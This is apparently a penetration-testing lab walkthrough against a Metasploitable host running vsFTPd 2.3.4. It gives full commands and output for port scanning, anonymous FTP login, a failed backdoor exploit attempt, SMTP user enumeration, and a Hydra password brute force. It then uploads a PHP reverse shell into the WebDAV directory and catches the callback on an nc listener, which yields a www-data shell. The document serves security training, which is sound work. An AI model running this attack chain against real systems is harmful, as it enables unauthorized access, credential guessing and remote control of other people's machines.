# Targeting vsFTPd

Find which port vsFTPd is running
```bash
└─# nmap -sV 10.0.27.218 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-28 12:26 IST
Nmap scan report for demo.ine.local (10.0.27.218)
Host is up (0.0023s latency).
Not shown: 982 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec?
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  ingreslock?
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1

# Detailed information of vsFTPd
└─# nmap -sV -sC  -p 21 10.0.27.218 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-28 12:35 IST
Nmap scan report for demo.ine.local (10.0.27.218)
Host is up (0.0023s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.43.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)    <- Allows anonymous login
|_Can't get directory listing: PASV IP 172.17.0.2 is not the same as 10.0.27.218
Service Info: OS: Unix
```

Log in Anonymously
```bash
└─# ftp 10.0.27.218 21
Connected to 10.0.27.218.
220 (vsFTPd 2.3.4)
Name (10.0.27.218:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

# Explore but nothing found
ftp> cd /
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||64777|).
ftp: Can't connect to `10.0.27.218:64777': Connection refused
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
ftp>

ftp> exit
221 Goodbye
```

Search Exploit
```bash
┌──(root㉿INE)-[~]
└─# searchsploit vsftpd                                                   
---------------------------------------- ---------------------------------
 Exploit Title                          |  Path
---------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Re | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remot | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remot | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service        | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Executi | unix/remote/17491.rb
vsftpd 2.3.4 - Backdoor Command Executi | unix/remote/49757.py
vsftpd 3.0.3 - Remote Denial of Service | multiple/remote/49719.py

# Copy exploit
└─# searchsploit -m 49757
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/49757
     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
    Codes: CVE-2011-2523
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /root/49757.py

# Give permission to execute
└─# chmod +x 49757.py

# Run (failed)
└─# python3 49757.py 10.0.27.218           
/root/49757.py:11: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  from telnetlib import Telnet
Traceback (most recent call last):
  File "/root/49757.py", line 37, in <module>
    tn2=Telnet(host, 6200)
        ^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/telnetlib.py", line 221, in __init__
    self.open(host, port, timeout)
  File "/usr/lib/python3.11/telnetlib.py", line 238, in open
    self.sock = socket.create_connection((host, port), timeout)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/socket.py", line 851, in create_connection
    raise exceptions[0]
  File "/usr/lib/python3.11/socket.py", line 836, in create_connection
    sock.connect(sa)
ConnectionRefusedError: [Errno 111] Connection refused

# In the description of the execute it uses port 6200 to connect backdoor but it's closed on the target (patch applied?)
└─# nmap -p 6200 10.0.27.218
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-28 12:45 IST
Nmap scan report for demo.ine.local (10.0.27.218)
Host is up (0.0029s latency).

PORT     STATE  SERVICE
6200/tcp closed lm-x
```

To identify system account, exploit SMTP server
```bash
└─# nmap -p 25 10.0.27.218
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-28 12:46 IST
Nmap scan report for demo.ine.local (10.0.27.218)
Host is up (0.0029s latency).

PORT   STATE SERVICE
25/tcp open  smtp

# Metasploit
# User enumeration
setg RHOSTS msf6 > setg RHOSTS 10.0.27.218
RHOSTS => 10.0.27.218
msf6 > setg RHOST 10.0.27.218
RHOST => 10.0.27.218
msf6 > use smtp_enum

msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.0.27.218:25        - 10.0.27.218:25 Banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
[+] 10.0.27.218:25        - 10.0.27.218:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, service
[*] 10.0.27.218:25        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Brute force password for username "service"
```bash
└─# hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.27.218 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-28 13:00:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
[DATA] attacking ftp://10.0.27.218:21/
[21][ftp] host: 10.0.27.218   login: service   password: service
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-28 13:00:21
```
Log in with credentials
```bash
└─# ftp 10.0.27.218                               
Connected to 10.0.27.218.
220 (vsFTPd 2.3.4)
Name (10.0.27.218:root): service
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

# Explore
ftp> cd /
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    1 0        0            4096 Jan 28  2018 bin
drwxr-xr-x    4 0        0            4096 May 14  2012 boot
lrwxrwxrwx    1 0        0              11 Apr 28  2010 cdrom -> media/cdrom
-rw-------    1 0        0         1499136 Jan 28  2018 core
drwxr-xr-x    5 0        0             400 Jul 28 06:47 dev
drwxr-xr-x    1 0        0            4096 May 20  2021 etc
drwxr-xr-x    1 0        0            4096 Apr 16  2010 home
drwxr-xr-x    2 0        0            4096 Mar 16  2010 initrd
lrwxrwxrwx    1 0        0              32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x    1 0        0            4096 Jan 28  2018 lib
drwx------    2 0        0            4096 Mar 16  2010 lost+found
drwxr-xr-x    4 0        0            4096 Mar 16  2010 media
drwxr-xr-x    3 0        0            4096 Jul 17  2017 mnt
-rw-------    1 0        0           15915 Jul 28 06:47 nohup.out
drwxr-xr-x    2 0        0            4096 Mar 16  2010 opt
dr-xr-xr-x  255 0        0               0 Jul 28 06:46 proc
drwxr-xr-x    1 0        0            4096 May 20  2021 root
drwxr-xr-x    2 0        0            4096 May 14  2012 sbin
drwxr-xr-x    2 0        0            4096 Mar 16  2010 srv
dr-xr-xr-x   13 0        0               0 Jul 28 06:46 sys
drwxrwxrwt    1 0        0            4096 Jul 28 06:49 tmp
drwxr-xr-x    1 0        0            4096 Apr 28  2010 usr
drwxr-xr-x    1 0        0            4096 May 20  2012 var
lrwxrwxrwx    1 0        0              29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server
226 Directory send OK.
```

Post exploitaion (Upload reverse shell)
```bash
# Directory where reversse shells at
└─# ls -al /usr/share/webshells/
total 36
drwxr-xr-x 1 root root 4096 Jun 26  2024 .
drwxr-xr-x 1 root root 4096 Jun 26  2024 ..
drwxr-xr-x 1 root root 4096 Jul  3  2024 asp
drwxr-xr-x 2 root root 4096 Jun 26  2024 aspx
drwxr-xr-x 2 root root 4096 Jun 26  2024 cfm
drwxr-xr-x 2 root root 4096 Jun 26  2024 jsp
lrwxrwxrwx 1 root root   19 Jun 26  2024 laudanum -> /usr/share/laudanum
drwxr-xr-x 2 root root 4096 Jun 26  2024 perl
drwxr-xr-x 3 root root 4096 Jun 26  2024 php
lrwxrwxrwx 1 root root   30 Jun 26  2024 seclists -> /usr/share/seclists/Web-Shells  

# Linux reverse shell = php
└─# ls -al /usr/share/webshells/php 
total 44
drwxr-xr-x 3 root root  4096 Jun 26  2024 .
drwxr-xr-x 1 root root  4096 Jun 26  2024 ..
drwxr-xr-x 2 root root  4096 Jun 26  2024 findsocket
-rw-r--r-- 1 root root  2800 Nov 21  2021 php-backdoor.php
-rwxr-xr-x 1 root root  5491 Nov 21  2021 php-reverse-shell.php
-rw-r--r-- 1 root root 13585 Nov 21  2021 qsd-php-backdoor.php
-rw-r--r-- 1 root root   328 Nov 21  2021 simple-backdoor.php

# Copy webshell to the root (.)
└─# cp /usr/share/webshells/php/php-reverse-shell.php .

# Rename
└─# mv php-reverse-shell.php shell.php

└─# vim shell.php   
# -> Change IP to Attacker IP

# Prepare listening port
└─# nc -nvlp 1234
listening on [any] 1234 ...
```

```bash
# Login ftp again
ftp>

# Default place Apache save all the data -> /var/www
ftp> cd /var/www
250 Directory successfully changed.

# Couldn't upload file (no permission to do)
ftp> put shell.php
local: shell.php remote: shell.php
200 EPRT command successful. Consider using EPSV.
553 Could not create file.

# Navigate to directory allowed to upload file
ftp> cd dav
250 Directory successfully changed.
# Upload file
ftp> put shell.php
local: shell.php remote: shell.php
200 EPRT command successful. Consider using EPSV.
150 Ok to send data.
100% |*****************************|  5492       33.57 MiB/s    00:00 ETA
226 Transfer complete.
5492 bytes sent in 00:00 (992.09 KiB/s)
```

Reflesh page on browser, click shell.php
```bash
listening on [any] 1234 ...
connect to [10.10.43.2] from (UNKNOWN) [10.0.27.218] 59620
Linux d1d6a9361621 5.4.0-1048-aws #50-Ubuntu SMP Mon May 3 21:44:17 UTC 2021 x86_64 GNU/Linux
 04:09:57 up  1:23,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: no job control in this shell
sh-3.2$ 


sh-3.2$ /bin/bash -i
/bin/bash -i
bash: no job control in this shell
www-data@d1d6a9361621:/$ ls
ls
bin
boot
cdrom
core
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
```
